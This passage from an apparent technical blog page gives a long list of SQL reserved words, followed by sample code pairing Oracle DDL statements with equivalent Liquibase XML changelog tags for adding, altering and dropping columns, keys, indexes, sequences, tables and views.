&quot;TEMPORARY&quot;, &quot;STANDARD&quot;, &quot;OPENDATASOURCE&quot;,</span><br><span class="line">            &quot;STATISTICS&quot;, &quot;COBOL&quot;, &quot;SECOND_MICROSECOND&quot;, &quot;NULLABLE&quot;, &quot;COMMITTED&quot;, &quot;DELAYED&quot;, &quot;PERCENT&quot;, &quot; ONLINE&quot;, &quot;DB2SQL&quot;,</span><br><span class="line">            &quot;TO&quot;, &quot;CONSTRUCTOR&quot;, &quot;DB2GNRL&quot;, &quot;UNION&quot;, &quot;FREEZE&quot;, &quot;SCOPE&quot;, &quot;CLASS&quot;, &quot;VIEW&quot;, &quot;LINES&quot;, &quot;ASSERTION&quot;, &quot;PACKAGE&quot;,</span><br><span class="line">            &quot;TRIGGER_NAME&quot;, &quot;CONSTRAINTS&quot;, &quot;LABEL&quot;, &quot;CURRENT_TIME&quot;, &quot;DEFERRED&quot;, &quot;REPLACE&quot;, &quot;KEY_MEMBER&quot;, &quot;INTEGER&quot;,</span><br><span class="line">            &quot;OVERRIDING&quot;, &quot;UNIQUE&quot;, &quot; MAXEXTENTS&quot;, &quot;TRAILING&quot;, &quot;COVAR_SAMP&quot;, &quot;FINAL&quot;, &quot; NOAUDIT&quot;, &quot;FULL&quot;, &quot;NAME&quot;, &quot;YEARS&quot;,</span><br><span class="line">            &quot;ROW_COUNT&quot;, &quot;NOCREATEROLE&quot;, &quot;CEILING&quot;, &quot;LAST&quot;, &quot;MAXVALUE&quot;, &quot;QUOTE&quot;, &quot;TOAST&quot;, &quot;LOCALTIME&quot;, &quot;CONTAINS&quot;, &quot;GENERAL&quot;,</span><br><span class="line">            &quot;DELIMITER&quot;, &quot;STDIN&quot;, &quot;REGEXP&quot;, &quot;REGR_COUNT&quot;, &quot;NOTIFY&quot;, &quot;NEXT&quot;, &quot;GLOBAL&quot;, &quot;LEAVE&quot;, &quot;SHOW&quot;, &quot;SHUTDOWN&quot;, &quot;VERBOSE&quot;,</span><br><span class="line">            &quot;NORMALIZE&quot;, &quot;CURRENT_TIMEZONE&quot;, &quot;MOD&quot;, &quot;EXISTS&quot;, &quot;TIME&quot;, &quot;MYISAM&quot;, &quot;INHERITS&quot;, &quot;DATETIME&quot;, &quot;HOURS&quot;,</span><br><span class="line">            &quot;NOMINVALUE&quot;, &quot;BOOL&quot;, &quot;ERRLVL&quot;, &quot;NESTING&quot;, &quot;FALSE&quot;, &quot;MINUTES&quot;, &quot;SECTION&quot;, &quot;NOCHECK&quot;, &quot;NOTNULL&quot;,</span><br><span class="line">            &quot;PERCENTILE_CONT&quot;, &quot;SYMMETRIC&quot;, &quot;VALID&quot;, &quot;PLAN&quot;, &quot;SHARE&quot;, &quot;TRAN&quot;, &quot;STDDEV_SAMP&quot;, &quot;WHEN&quot;,</span><br><span class="line">            &quot;TRANSACTIONS_COMMITTED&quot;, &quot;BREAK&quot;, &quot;LOCAL&quot;, &quot;CONSTRAINT_CATALOG&quot;, &quot;DICTIONARY&quot;, &quot;LOGIN&quot;, &quot;CLUSTER&quot;, &quot;GRANTS&quot;,</span><br><span class="line">            &quot;DAY_MINUTE&quot;, &quot;LONGBLOB&quot;, &quot;CYCLE&quot;, &quot;CAST&quot;, &quot;INSTANCE&quot;, &quot;VARCHAR2&quot;, &quot;FUNCTION&quot;, &quot;LEADING&quot;, &quot;MODIFIES&quot;, &quot;NOWAIT&quot;,</span><br><span class="line">            &quot;CASE&quot;, &quot;OUT&quot;, &quot;OPTIMIZE&quot;, &quot;REGR_SXX&quot;, &quot;REGR_SXY&quot;, &quot;OVERLAPS&quot;, &quot;GET&quot;, &quot;DENSE_RANK&quot;, &quot;PUBLIC&quot;, &quot;COUNT&quot;, &quot;TREAT&quot;,</span><br><span class="line">            &quot;NAMES&quot;, &quot; NOCOMPRESS&quot;, &quot;IDENTITY_INSERT&quot;, &quot;NONCLUSTERED&quot;, &quot;LENGTH&quot;, &quot;UNSIGNED&quot;, &quot;CHAR&quot;, &quot;BEGIN&quot;, &quot;MAX_ROWS&quot;,</span><br><span class="line">            &quot;WRITE&quot;, &quot;ORDER&quot;, &quot;ISOLATION&quot;, &quot;REPLICATION&quot;, &quot;SQL_CALC_FOUND_ROWS&quot;, &quot;REGR_SYY&quot;, &quot;LANCOMPILER&quot;, &quot; CLUSTER&quot;,</span><br><span class="line">            &quot;CHARACTER_SET_NAME&quot;, &quot;SIGNAL&quot;, &quot;SUBMULTISET&quot;, &quot;COLLATE&quot;, &quot;MODIFY&quot;, &quot;INSTANTIABLE&quot;, &quot;UNCOMMITTED&quot;, &quot;RESIGNAL&quot;,</span><br><span class="line">            &quot;MORE&quot;, &quot;PROC&quot;, &quot;REPEATABLE&quot;, &quot;COMPLETION&quot;, &quot;KEY_TYPE&quot;, &quot;KILL&quot;, &quot;TRANSFORMS&quot;, &quot;VOLATILE&quot;, &quot;INPUT&quot;, &quot;SUBSTRING&quot;,</span><br><span class="line">            &quot;ZONE&quot;, &quot;VCAT&quot;, &quot;DEREF&quot;, &quot;AUXILIARY&quot;, &quot;REGR_AVGY&quot;, &quot;REGR_AVGX&quot;, &quot;TEMPLATE&quot;, &quot;INCLUDING&quot;, &quot;INSENSITIVE&quot;, &quot;BOTH&quot;,</span><br><span class="line">            &quot;CHARACTER_SET_CATALOG&quot;, &quot;ENABLE&quot;, &quot;EXCEPT&quot;, &quot;HOSTS&quot;, &quot;SCHEMA_NAME&quot;, &quot;PREFIX&quot;, &quot;SCROLL&quot;, &quot;METHOD&quot;, &quot;DAY_SECOND&quot;,</span><br><span class="line">            &quot;DESTRUCTOR&quot;, &quot;OIDS&quot;, &quot;INT&quot;, &quot;PASCAL&quot;, &quot;COLLID&quot;, &quot;PART&quot;, &quot;ALSO&quot;, &quot;CARDINALITY&quot;, &quot;ACCESS&quot;, &quot;OPENQUERY&quot;, &quot;CLOB&quot;,</span><br><span class="line">            &quot;COMMIT&quot;, &quot;DISPATCH&quot;, &quot;STRUCTURE&quot;, &quot;DETERMINISTIC&quot;, &quot;SAVEPOINT&quot;, &quot;UNTIL&quot;, &quot;USER&quot;, &quot;TEMP&quot;, &quot;MEDIUMBLOB&quot;, &quot;MOVE&quot;,</span><br><span class="line">            &quot;CROSS&quot;, &quot;SMALLINT&quot;, &quot;UESCAPE&quot;, &quot;USER_DEFINED_TYPE_CATALOG&quot;, &quot;RESULT&quot;, &quot;SQLID&quot;, &quot;PATH&quot;, &quot;RESULT_SET_LOCATOR&quot;,</span><br><span class="line">            &quot;PURGE&quot;, &quot;TRIM&quot;, &quot;ROWGUIDCOL&quot;, &quot;RAW&quot;, &quot;RANK&quot;, &quot;VAR_POP&quot;, &quot;MUMPS&quot;, &quot;TRANSLATION&quot;, &quot;MINUS&quot;, &quot;EXPLAIN&quot;,</span><br><span class="line">            &quot;PARAMETER_SPECIFIC_CATALOG&quot;, &quot; INITIAL&quot;, &quot;MESSAGE_LENGTH&quot;, &quot;HOUR_MINUTE&quot;, &quot;LISTEN&quot;, &quot;WIDTH_BUCKET&quot;, &quot;STORAGE&quot;,</span><br><span class="line">            &quot;CURRENT_DEFAULT_TRANSFORM_GROUP&quot;, &quot;STDOUT&quot;, &quot;CUBE&quot;, &quot;IMMUTABLE&quot;, &quot;REGR_R2&quot;, &quot;SQL_LOG_UPDATE&quot;, &quot;XOR&quot;,</span><br><span class="line">            &quot;FREETEXTTABLE&quot;, &quot;ALTER&quot;, &quot;MONTHNAME&quot;, &quot;FUSION&quot;, &quot;DESTROY&quot;, &quot;PARAMETER_SPECIFIC_NAME&quot;, &quot;TEXTSIZE&quot;, &quot;SPACE&quot;,</span><br><span class="line">            &quot;UPPER&quot;, &quot;ABS&quot;, &quot;CREATEUSER&quot;, &quot;INTEGRITY&quot;, &quot;OCTET_LENGTH&quot;, &quot;TINYINT&quot;, &quot;INTERVAL&quot;, &quot;COLLATION_SCHEMA&quot;,</span><br><span class="line">            &quot;CATALOG_NAME&quot;, &quot;UNLISTEN&quot;, &quot;MASTER_SSL_VERIFY_SERVER_CERT&quot;, &quot;POWER&quot;, &quot;CONNECTION&quot;, &quot;PAD&quot;, &quot;REF&quot;, &quot;LOCALE&quot;,</span><br><span class="line">            &quot;OPERATION&quot;, &quot;SIMPLE&quot;, &quot;VARBINARY&quot;, &quot;VARIABLES&quot;, &quot;ADA&quot;, &quot;VIRTUAL&quot;, &quot; FILE&quot;, &quot;SYSTEM&quot;, &quot;ADD&quot;, &quot;SCOPE_CATALOG&quot;,</span><br><span class="line">            &quot;SQLERROR&quot;, &quot;CHECKED&quot;, &quot;VARIANT&quot;, &quot;OLD_TABLE&quot;, &quot;INFIX&quot;, &quot;TRUSTED&quot;, &quot;INDEX&quot;, &quot;FOUND&quot;, &quot;HOLD&quot;, &quot;EXTRACT&quot;,</span><br><span class="line">            &quot;OFFSETS&quot;, &quot;ATTRIBUTE&quot;, &quot;PERCENTILE_DISC&quot;, &quot;ITERATE&quot;, &quot;CURRENT_SERVER&quot;, &quot;CACHE&quot;, &quot; LOCK&quot;, &quot;CURRENT&quot;, &quot; NOWAIT&quot;,</span><br><span class="line">            &quot;RETURNED_SQLSTATE&quot;, &quot;SYSPROC&quot;, &quot;CONNECTION_NAME&quot;, &quot;END&quot;, &quot;PRESERVE&quot;, &quot;LOAD&quot;, &quot;TERMINATED&quot;, &quot;BINARY&quot;, &quot;FORWARD&quot;,</span><br><span class="line">            &quot;SOME&quot;, &quot;LAST_INSERT_ID&quot;, &quot;OUTER&quot;, &quot;INFILE&quot;, &quot;RENAME&quot;, &quot;EXCLUSIVE&quot;, &quot;FILTER&quot;, &quot;IDENTIFIED&quot;, &quot;NORMALIZED&quot;,</span><br><span class="line">            &quot; COLUMN&quot;, &quot;INITIALLY&quot;, &quot;OVER&quot;, &quot;CURRENT_ROLE&quot;, &quot;GRANT&quot;, &quot;OTHERS&quot;, &quot;SONAME&quot;, &quot;CHAR_LENGTH&quot;, &quot;NOMAXVALUE&quot;,</span><br><span class="line">            &quot;ROWID&quot;, &quot;DEFAULT&quot;, &quot;SQRT&quot;, &quot;JOIN&quot;, &quot;LOCK&quot;, &quot;TEXT&quot;, &quot;UNNEST&quot;, &quot;AVG_ROW_LENGTH&quot;, &quot;SESSION_USER&quot;, &quot;AGGREGATE&quot;,</span><br><span class="line">            &quot;MULTISET&quot;, &quot;ELSE&quot;, &quot;TRANSACTION_ACTIVE&quot;, &quot;LANGUAGE&quot;, &quot;PERCENT_RANK&quot;, &quot;ENUM&quot;, &quot;NATIONAL&quot;, &quot;SETOF&quot;,</span><br><span class="line">            &quot;RETURNED_CARDINALITY&quot;, &quot;SYNONYM&quot;, &quot;CURRENT_TRANSFORM_GROUP_FOR_TYPE&quot;, &quot;SPECIFICTYPE&quot;, &quot;TOP&quot;, &quot;FORTRAN&quot;,</span><br><span class="line">            &quot;DEGREE&quot;, &quot;ASYMMETRIC&quot;, &quot;GRAPHIC&quot;, &quot;ALWAYS&quot;, &quot;MEDIUMTEXT&quot;, &quot;SYSTEM_USER&quot;, &quot;ROUTINE_CATALOG&quot;, &quot;CURSOR_NAME&quot;,</span><br><span class="line">            &quot;RIGHT&quot;, &quot;STABLE&quot;, &quot;FILE&quot;, &quot;CREATEDB&quot;, &quot;DISTRIBUTED&quot;, &quot;FILLFACTOR&quot;, &quot;FETCH&quot;, &quot;NUMERIC&quot;, &quot;STARTING&quot;, &quot;REVOKE&quot;,</span><br><span class="line">            &quot;SQLEXCEPTION&quot;, &quot;DYNAMIC&quot;, &quot;CHAIN&quot;, &quot;CALLED&quot;, &quot;INCREMENT&quot;, &quot;ELEMENT&quot;, &quot;MAXEXTENTS&quot;, &quot;ROUTINE_SCHEMA&quot;,</span><br><span class="line">            &quot;IO_AFTER_GTIDS&quot;, &quot;TRIGGER_SCHEMA&quot;, &quot;ALL&quot;, &quot;NEW&quot;, &quot;THAN&quot;, &quot;ALIAS&quot;, &quot;HOST&quot;, &quot;VALUE&quot;, &quot;LOGS&quot;, &quot;SERIALIZABLE&quot;,</span><br><span class="line">            &quot;X509&quot;, &quot;AUTO_INCREMENT&quot;, &quot;BACKUP&quot;, &quot;MINUTE_MICROSECOND&quot;, &quot;ALLOCATE&quot;, &quot;HOLDLOCK&quot;, &quot;MINUTE&quot;, &quot;SCALE&quot;, &quot;TINYTEXT&quot;,</span><br><span class="line">            &quot;DESCRIBE&quot;, &quot;NOCREATEDB&quot;, &quot; INTERSECT&quot;, &quot; PCTFREE&quot;, &quot; PRIOR&quot;, &quot;NULL&quot;, &quot;TRUE&quot;, &quot;PCTFREE&quot;, &quot;EXISTING&quot;,</span><br><span class="line">            &quot;PARAMETERS&quot;, &quot;OBJECT&quot;, &quot;TABLESPACE&quot;, &quot;UTC_TIME&quot;, &quot; LEVEL&quot;, &quot;MODULE&quot;, &quot;PASSWORD&quot;, &quot;EXCLUDE&quot;, &quot;SQL_WARNINGS&quot;,</span><br><span class="line">            &quot;AND&quot;, &quot;SQLCODE&quot;, &quot;ROW&quot;, &quot;CURRENT_DATE&quot;, &quot;MESSAGE_TEXT&quot;, &quot;DISK&quot;, &quot;RANGE&quot;, &quot;VACUUM&quot;, &quot;MLSLABEL&quot;, &quot;STORED&quot;, &quot;HOUR&quot;,</span><br><span class="line">            &quot;CONCAT&quot;, &quot;APPLICATION&quot;, &quot;INITIAL&quot;, &quot;ANY&quot;, &quot;PLI&quot;, &quot;HEAP&quot;, &quot; AUDIT&quot;, &quot;NATURAL&quot;, &quot;NOINHERIT&quot;, &quot;STORES&quot;, &quot;UNNAMED&quot;,</span><br><span class="line">            &quot;KEYS&quot;, &quot;RESTART&quot;, &quot;READS&quot;, &quot;NUMPARTS&quot;, &quot;CSV&quot;, &quot;IMPLEMENTATION&quot;, &quot;ORDERING&quot;, &quot;TRANSLATE&quot;, &quot;REINDEX&quot;, &quot;JAR&quot;,</span><br><span class="line">            &quot;EXP&quot;, &quot;MATCH&quot;, &quot;PRINT&quot;, &quot;NOCREATEUSER&quot;, &quot;CHECKSUM&quot;, &quot;ELSEIF&quot;, &quot;MONTH&quot;, &quot;ROWCOUNT&quot;, &quot;AFTER&quot;, &quot;CLOSE&quot;, &quot;RRN&quot;,</span><br><span class="line">            &quot;MONTHS&quot;, &quot;OWNER&quot;, &quot;DENY&quot;, &quot;END-EXEC&quot;, &quot;INCLUDE&quot;, &quot;OCTETS&quot;, &quot;UPDATETEXT&quot;, &quot;PRIOR&quot;, &quot;SYSIBM&quot;, &quot; DATE&quot;,</span><br><span class="line">            &quot;SCRATCHPAD&quot;, &quot;NODENAME&quot;, &quot;IDENTITY&quot;, &quot;ARE&quot;, &quot;FULLTEXT&quot;, &quot;SOURCE&quot;, &quot;CONDITION&quot;, &quot;THEN&quot;, &quot;PROCEDURAL&quot;, &quot;UNLOCK&quot;,</span><br><span class="line">            &quot;HIERARCHY&quot;, &quot;ORDINALITY&quot;, &quot;INTO&quot;, &quot;MICROSECONDS&quot;, &quot;REPEAT&quot;, &quot;MICROSECOND&quot;, &quot;EXCEPTION&quot;, &quot;INDICATOR&quot;, &quot;FREE&quot;,</span><br><span class="line">            &quot;RETURNED_OCTET_LENGTH&quot;, &quot;NOCOMPRESS&quot;, &quot;ASC&quot;, &quot;DELETE&quot;, &quot;COVAR_POP&quot;, &quot;VARIABLE&quot;, &quot; INDEX&quot;, &quot;PREPARED&quot;,</span><br><span class="line">            &quot;GENERATED&quot;, &quot;SIMILAR&quot;, &quot;LONG&quot;, &quot;RESOURCE&quot;, &quot;INT1&quot;, &quot;INT2&quot;, &quot;PROCEDURE&quot;, &quot;INT3&quot;, &quot;STDDEV_POP&quot;, &quot;INT4&quot;, &quot;SECONDS&quot;,</span><br><span class="line">            &quot;COLLECT&quot;, &quot;ANALYZE&quot;, &quot;RUN&quot;, &quot;UNDER&quot;, &quot;INT8&quot;, &quot;OPEN&quot;, &quot;DERIVED&quot;, &quot;NO_WRITE_TO_BINLOG&quot;, &quot;REFERENCING&quot;, &quot;STRING&quot;,</span><br><span class="line">            &quot;PSID&quot;, &quot;BREADTH&quot;, &quot;STAY&quot;, &quot;LOCATOR&quot;, &quot;NOCACHE&quot;, &quot;LOOP&quot;, &quot;HIGH_PRIORITY&quot;, &quot;IMMEDIATE&quot;, &quot;DESC&quot;, &quot;FREETEXT&quot;,</span><br><span class="line">            &quot;NUMBER&quot;, &quot;AUX&quot;, &quot;OUTPUT&quot;, &quot;LONGTEXT&quot;, &quot;DATABASES&quot;, &quot;BOOLEAN&quot;, &quot;AVG&quot;, &quot;NOT&quot;, &quot;PLACING&quot;, &quot;INTERSECTION&quot;, &quot;LOWER&quot;,</span><br><span class="line">            &quot;SPECIFIC&quot;, &quot;MINUTE_SECOND&quot;, &quot;FLOAT8&quot;, &quot;HAVING&quot;, &quot;FIELDPROC&quot;, &quot;FLOAT4&quot;, &quot;SQLSTATE&quot;, &quot;RECONFIGURE&quot;, &quot;LOCKMAX&quot;,</span><br><span class="line">            &quot;BACKWARD&quot;, &quot;BUFFERPOOL&quot;, &quot;VALIDPROC&quot;, &quot; MINUS&quot;, &quot;COMMAND_FUNCTION&quot;, &quot;DROP&quot;, &quot;RETURN&quot;, &quot;FOREIGN&quot;,</span><br><span class="line">            &quot;PARAMETER_NAME&quot;, &quot;TSEQUAL&quot;, &quot;SQL_SMALL_RESULT&quot;, &quot;RULE&quot;, &quot;SERVER_NAME&quot;, &quot;DAYOFMONTH&quot;, &quot;IO_BEFORE_GTIDS&quot;,</span><br><span class="line">            &quot;PARTIAL&quot;, &quot;MEDIUMINT&quot;, &quot;TRANSACTIONS_ROLLED_BACK&quot;, &quot;OPENXML&quot;, &quot; DROP&quot;, &quot;ESCAPE&quot;, &quot;SCOPE_NAME&quot;, &quot;ISAM&quot;, &quot;LINEAR&quot;,</span><br><span class="line">            &quot;PARAMETER_ORDINAL_POSITION&quot;, &quot; OFFLINE&quot;, &quot;ROWNUM&quot;, &quot;DATETIME_INTERVAL_CODE&quot;, &quot;DEFINED&quot;, &quot;LOCALTIMESTAMP&quot;,</span><br><span class="line">            &quot; CONNECT&quot;, &quot;ISOBID&quot;, &quot;TABLE&quot;, &quot;ANALYSE&quot;, &quot;DEFINER&quot;, &quot;SCOPE_SCHEMA&quot;, &quot;COLLATION_CATALOG&quot;, &quot;NONE&quot;, &quot;PROCESSLIST&quot;,</span><br><span class="line">            &quot;TYPE&quot;, &quot;USER_DEFINED_TYPE_CODE&quot;, &quot;DESCRIPTOR&quot;, &quot;PIECESIZE&quot;, &quot;OPTION&quot;, &quot;WHENEVER&quot;, &quot;ENCLOSED&quot;, &quot;LEVEL&quot;,</span><br><span class="line">            &quot;COUNT_BIG&quot;, &quot;ASENSITIVE&quot;, &quot;LOCKSIZE&quot;, &quot;TINYBLOB&quot;, &quot;PREPARE&quot;, &quot;CHECK&quot;, &quot;WITHOUT&quot;, &quot;WORK&quot;, &quot;HANDLER&quot;, &quot;CUME_DIST&quot;,</span><br><span class="line">            &quot;WRITETEXT&quot;, &quot;INITIALIZE&quot;, &quot;DAY_HOUR&quot;, &quot;ILIKE&quot;, &quot;CONNECT&quot;, &quot;TABLESAMPLE&quot;, &quot;INSERT_ID&quot;, &quot;MIDDLEINT&quot;, &quot;RELATIVE&quot;,</span><br><span class="line">            &quot;LARGE&quot;, &quot;ACCESSIBLE&quot;, &quot;VALUES&quot;, &quot;DOUBLE&quot;, &quot;ASUTIME&quot;, &quot;DEFAULTS&quot;, &quot;NOLOGIN&quot;, &quot;TIMEZONE_HOUR&quot;, &quot;COMPUTE&quot;, &quot;COPY&quot;,</span><br><span class="line">            &quot;SELF&quot;, &quot;SESSION&quot;, &quot;NOCYCLE&quot;, &quot;DUMMY&quot;, &quot;WINDOW&quot;, &quot;EXECUTE&quot;, &quot;PRECEDING&quot;, &quot;PACK_KEYS&quot;, &quot;NOORDER&quot;, &quot;CHECKPOINT&quot;,</span><br><span class="line">            &quot; LONG&quot;, &quot;DAY&quot;, &quot;AUTHORIZATION&quot;, &quot;CCSID&quot;, &quot;COLLECTION&quot;, &quot;BLOB&quot;, &quot;PRIQTY&quot;, &quot;RECURSIVE&quot;, &quot;ONLY&quot;, &quot;FROM&quot;,</span><br><span class="line">            &quot;SQL_BIG_TABLES&quot;, &quot;LATERAL&quot;, &quot;TRANSFORM&quot;, &quot;HOUR_MICROSECOND&quot;, &quot;SENSITIVE&quot;, &quot;SUBCLASS_ORIGIN&quot;, &quot;CONVERSION&quot;,</span><br><span class="line">            &quot;DAY_MICROSECOND&quot;, &quot;SEPARATOR&quot;, &quot;OPTIMIZER_COSTS&quot;, &quot;NOSUPERUSER&quot;, &quot;DATE&quot;, &quot;ROLLUP&quot;, &quot;TOP_LEVEL_COUNT&quot;, &quot;CORR&quot;,</span><br><span class="line">            &quot;UNENCRYPTED&quot;, &quot;UTC_TIMESTAMP&quot;, &quot;LIKE&quot;, &quot;ZEROFILL&quot;, &quot;DATA&quot;, &quot;SUCCESSFUL&quot;, &quot;INSERT&quot;, &quot;YEAR_MONTH&quot;, &quot;OFFLINE&quot;,</span><br><span class="line">            &quot;INOUT&quot;, &quot;VAR_SAMP&quot;, &quot;BROWSE&quot;, &quot;SCHEMAS&quot;, &quot;CONSTRAINT_NAME&quot;, &quot;PARAMETER_MODE&quot;, &quot;LIMIT&quot;, &quot;LINKTYPE&quot;, &quot;NULLS&quot;,</span><br><span class="line">            &quot;DEC&quot;, &quot;CASCADED&quot;, &quot;ENCRYPTED&quot;, &quot;CONTAINSTABLE&quot;, &quot;DYNAMIC_FUNCTION&quot;, &quot;CONDITION_NUMBER&quot;, &quot;BEFORE&quot;, &quot;DB2GENERAL&quot;,</span><br><span class="line">            &quot;DECLARE&quot;, &quot;SUPERUSER&quot;, &quot;WHILE&quot;</span><br></pre></td></tr></table></figure></div>

<ol start="6">
<li>sample code</li>
</ol>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line">1. Add column</span><br><span class="line">oracle：alter table tra_report_header add address varchar(100) null;</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">addColumn</span> <span class="attr">tableName</span>=<span class="string">&quot;tra_report_header&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">type</span>=<span class="string">&quot;varchar(100)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">addColumn</span>&gt;</span></span><br><span class="line"></span><br><span class="line">2. set default value for column</span><br><span class="line">oracle：alter table tra_report_header modify address default &quot;上海&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">addDefaultValue</span> <span class="attr">columnDataType</span>=<span class="string">&quot;varchar&quot;</span> <span class="attr">columnName</span>=<span class="string">&quot;address&quot;</span> <span class="attr">defaultValue</span>=<span class="string">&quot;上海&quot;</span> <span class="attr">tableName</span>=<span class="string">“tra_report_header”/</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.add nonnull constraint</span><br><span class="line">oracle：alter table tra_report_header modify address not null;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">addNotNullConstraint</span> <span class="attr">columnDataType</span>=<span class="string">&quot;varchar&quot;</span> <span class="attr">columnName</span>=<span class="string">&quot;address&quot;</span> <span class="attr">tableName</span>=<span class="string">&quot;tra_report_header&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">4. add primary key</span><br><span class="line">oracle：alter table tra_report_header add primary key id;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">addPrimaryKey</span> <span class="attr">columnNames</span>=<span class="string">&quot;id&quot;</span> <span class="attr">constraintName</span>=<span class="string">&quot;pk_tra_report_header&quot;</span> <span class="attr">tableName</span>=<span class="string">&quot;tra_report_header&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5. delete primary key</span><br><span class="line">oracle：alter table tra_report_header drop constraint pk_tra_report_header cascade;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dropPrimaryKey</span> <span class="attr">constraintName</span>=<span class="string">&quot;pk_tra_report_header&quot;</span> <span class="attr">tableName</span>=<span class="string">&quot;tra_report_header&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6. create index</span><br><span class="line">oracle：create unique index tra_report_header_u1 on tra_report_header(name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">createIndex</span>  <span class="attr">indexName</span>=<span class="string">&quot;tra_report_header_u1&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">tableName</span>=<span class="string">&quot;tra_report_header&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">unique</span>=<span class="string">“true”</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;varchar(100)&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">createIndex</span>&gt;</span></span><br><span class="line"></span><br><span class="line">7. create sequence</span><br><span class="line">oracle：create sequence tra_report_header_s start with 1 increment by 1;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">createSequence</span> <span class="attr">startValue</span>=<span class="string">&quot;1&quot;</span>  </span></span><br><span class="line"><span class="tag">                <span class="attr">sequenceName</span>=<span class="string">&quot;tra_report_header_s&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">incrementBy</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8. modify sequence</span><br><span class="line">oracle：alter sequence tra_report_header_s increment by 1111;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">alterSequence</span> <span class="attr">incrementBy</span>=<span class="string">&quot;1&quot;</span> <span class="attr">equenceName</span>=<span class="string">&quot;tra_report_header_s&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">9. create table</span><br><span class="line">oracle: create table tra_report_header(name varchar2(100));</span><br><span class="line"></span><br><span class="line">comment on table tra_report_header is &quot;报销单头标&quot;;</span><br><span class="line">comment on column tra_report_header.name  is &quot;姓名&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">createTable</span> <span class="attr">tableName</span>=<span class="string">&quot;tra_report_header&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;varchar2(100)&quot;</span> <span class="attr">remark</span>=<span class="string">&quot;姓名&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">createTable</span>&gt;</span></span><br><span class="line"></span><br><span class="line">10. create view</span><br><span class="line">oracle：create or replace view tra_report_header_v  as</span><br><span class="line">select * from tra_report_header t where id &gt; 10;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">createView</span> <span class="attr">replaceIfExists</span>=<span class="string">&quot;true&quot;</span> <span class="attr">viewName</span>=<span class="string">&quot;tra_report_header_v&quot;</span>&gt;</span></span><br><span class="line">    select * from tra_report_header t where t.id &gt; 10</span><br><span class="line"><span class="tag">&lt;/<span class="name">createView</span>&gt;</span></span><br><span class="line"></span><br><span class="line">11. delete column</span><br><span class="line">oracle：alter table tra_report_header drop column attribute;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dropColumn</span> <span class="attr">column</span>=<span class="string">&quot;attribute&quot;</span> <span class="attr">tableName</span>=<span class="string">&quot;tra_report_header&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">12. delete index </span><br><span class="line">oracle：drop index tra_report_header_n1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dropIndex</span> <span class="attr">indexName</span>=<span class="string">&quot;tra_report_header_n1&quot;</span> <span class="attr">tableName</span>=<span class="string">&quot;tra_report_header&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">13. delete non null constraint</span><br><span class="line">oracle:alter table tra_report_header modify name null;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dropNotNullConstraint</span> <span class="attr">columnDataType</span>=<span class="string">&quot;varchar(100)&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">columnName</span>=<span class="string">&quot;name&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">tableName</span>=<span class="string">&quot;tra_report_header&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">14. delete sequence</span><br><span class="line">oracle:drop sequence tra_report_header_s;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dropSequence</span> <span class="attr">sequenceName</span>=<span class="string">&quot;tra_report_header_s&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">15. delete table</span><br><span class="line">oracle:drop table tra_report_header;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dropTable</span> <span class="attr">tableName</span>=<span class="string">&quot;tra_report_header&quot;</span> <span class="attr">cascadeConstraints</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">16. delete unique index</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dropUniqueContraint</span> <span class="attr">constraintsName</span>=<span class="string">&quot;tra_report_header_u1&quot;</span></span></span><br><span class="line"><span class="tag">     